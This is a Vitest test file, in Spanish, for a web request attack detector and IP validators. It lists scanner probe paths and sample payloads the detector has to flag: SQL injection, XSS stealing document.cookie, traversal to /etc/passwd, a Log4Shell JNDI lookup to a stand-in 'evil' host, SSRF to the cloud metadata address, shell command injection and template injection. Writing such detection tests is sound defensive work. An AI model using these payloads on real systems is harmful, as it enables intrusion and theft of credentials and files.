import { describe, expect, it } from 'vitest';
import { detectarAtaque, esIpPrivada, ipValida } from './firmas';

describe('detectarAtaque', () => {
  it.each([
    ['/.env', 'escaneo'], ['/.git/config', 'escaneo'], ['/api/.env.local', 'escaneo'], ['/wp-login.php', 'escaneo'],
    ['/wp-admin/setup-config.php', 'escaneo'], ['/phpmyadmin/', 'escaneo'], ['/index.php', 'escaneo'], ['/cgi-bin/luci', 'escaneo'],
    ['/vendor/phpunit/src/Util/PHP/eval-stdin.php', 'escaneo'], ['/backup.sql', 'escaneo'], ['/config.json', 'escaneo'], ['/actuator/health', 'escaneo'],
  ])('%s es un escaneo', (ruta, familia) => {
    expect(detectarAtaque(ruta)?.familia).toBe(familia);
  });

  it.each([
    ['/facturas', '?q=1%27%20OR%20%271%27=%271', 'sqli'],
    ['/api/aprobar/x', '?id=1 UNION SELECT password FROM users', 'sqli'],
    ['/buscar', '?q=1;SELECT pg_sleep(5)', 'sqli'],
    ['/login', '?next=%3Cscript%3Ealert(1)%3C/script%3E', 'xss'],
    ['/login', '?next=javascript:alert(document.cookie)', 'xss'],
    ['/descargas/..%2f..%2fetc/passwd', '', 'traversal'],
    ['/x', '?f=%252e%252e%252fetc%252fpasswd', 'traversal'],
    ['/x', '?u=${jndi:ldap://evil/a}', 'log4shell'],
    ['/x', '?url=http://169.254.169.254/latest/meta-data/', 'ssrf'],
    ['/x', '?c=;cat /etc/passwd', 'comando'],
    ['/x', '?name={{7*7}}', 'plantilla'],
  ])('%s%s es %s', (ruta, query, tipo) => {
    const d = detectarAtaque(ruta, query);
    expect(d?.familia).toBe('inyeccion');
    expect(d?.tipo).toBe(tipo);
  });

  it.each([
    ['/dashboard', ''], ['/facturas/3f2b1c4e-1111-4222-8333-444455556666', ''], ['/login', '?next=/facturas/nueva'],
    ['/clientes', '?q=Ferretería Martín'], ['/listados-fiscales/303', '?periodo=2026-3T'], ['/portal/abc_DEF-123', ''],
    ['/aprobar/9f86d081884c7d659a2feaa0c55ad015', '?paid=true'], ['/ayuda', '?q=cómo hago una factura rectificativa'],
    ['/conciliacion', '?banco=conectado'], ['/api/stripe/webhook/tenant/3f2b1c4e-1111-4222-8333-444455556666', ''],
    ['/productos', '?q=tornillos 4x40 inox'], ['/gastos', '?desde=2026-01-01&hasta=2026-03-31'], ['/precios', '?plan=pro&periodo=anual'],
  ])('%s%s es normal', (ruta, query) => {
    expect(detectarAtaque(ruta, query)).toBeNull();
  });
});

describe('esIpPrivada', () => {
  it('no bloquea la propia máquina ni las redes privadas', () => {
    expect(esIpPrivada('127.0.0.1')).toBe(true);
    expect(esIpPrivada('10.2.3.4')).toBe(true);
    expect(esIpPrivada('172.20.1.1')).toBe(true);
    expect(esIpPrivada('unknown')).toBe(true);
    expect(esIpPrivada('83.45.12.9')).toBe(false);
    expect(esIpPrivada('2a02:9130::1')).toBe(false);
  });
});

describe('ipValida', () => {
  it('acepta direcciones de verdad', () => {
    expect(ipValida('83.45.12.9')).toBe(true);
    expect(ipValida('2a02:9130::1')).toBe(true);
  });
  it('rechaza lo que no es una dirección', () => {
    expect(ipValida('83.45.12.256')).toBe(false);
    expect(ipValida('83.45.12.0/24')).toBe(false);
    expect(ipValida('hola')).toBe(false);
    expect(ipValida("1.1.1.1'; drop")).toBe(false);
    expect(ipValida('2a02:::1')).toBe(false);
    expect(ipValida('')).toBe(false);
  });
});
